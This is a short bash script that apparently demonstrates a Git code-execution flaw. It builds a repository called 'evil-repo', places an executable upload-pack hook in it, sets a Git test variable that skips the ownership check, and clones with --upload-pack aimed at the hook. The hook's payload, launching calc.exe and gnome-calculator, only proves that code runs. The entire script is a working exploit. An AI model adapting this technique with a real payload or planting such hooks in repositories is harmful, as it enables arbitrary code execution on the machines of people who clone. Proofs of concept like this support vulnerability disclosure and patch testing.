#!/bin/bash

evil_repo_path="$PWD/evil-repo"

git init "$evil_repo_path"
cd "$evil_repo_path"

mkdir -p .git/hooks
cat > .git/hooks/upload-pack <<EOF
#!/bin/bash
calc.exe
gnome-calculator
EOF

chmod +x .git/hooks/upload-pack

echo "Initial content" > file.txt
git add file.txt
git commit -m "Initial commit"

cd ..

clone_target_path="$PWD/cloned-repo"

export GIT_TEST_ASSUME_DIFFERENT_OWNER=true

git clone --upload-pack="$evil_repo_path/.git/hooks/upload-pack"  file://"$evil_repo_path" "$clone_target_path"